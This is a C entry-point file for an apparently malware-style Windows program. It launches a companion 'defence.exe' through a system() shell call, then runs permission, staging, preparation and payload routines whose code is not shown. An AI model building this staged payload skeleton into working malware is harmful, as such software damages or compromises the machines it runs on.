#include <stdio.h>
#include <process.h>
#include <windows.h>

#include "source/permisson.h"
#include "source/stage.h"
#include "source/prepare.h"
#include "source/payloads.h"

int main(int argc, char *argv[])
{
    printf("\033[2J\033[HHello, world from main.c!\n"); /* ANSI Escape Codes | [\033[2J  = clear screen | \033[H   = move to (0, 0)] */

    /* Initializing some vars */
    char cpath[MAX_PATH]; // current path
    GetCurrentDirectory(MAX_PATH, cpath);

    /* Calling the Defence Script */ // TODO: using exec or CreateProcess instead of system()
    char _defence[512];
    snprintf(_defence, sizeof(_defence), "start \"\" \"%s\\defence.exe\" %s", cpath, argv[0]);
    system(_defence); // start "" "X:\coding\projects\666\dababy\new\build\defence.exe" nezuko.exe

    /* Calling the Permisson Section */
    if (permissons() == 1)
    {
        printf("\n[!] Error: Permisson Denied!\n");
        return 1;
    }
    
    /* Calling the Stage Section */
    if (stage() == 1)
    {
        printf("\n[!] Error: Stage Failed!\n");
        return 1;
    }

    /* Calling the Prepare Section */
    if (prepare() == 1)
    {
        printf("\n[!] Error: Prepare Failed!\n");
        return 1;
    }

    /* Calling the Payload Section */
    if (payloads() == 1)
    {
        printf("\n[!] Error: Payload Failed!\n");
        return 1;
    }

    getchar(); // enter to exit
    return 0;
}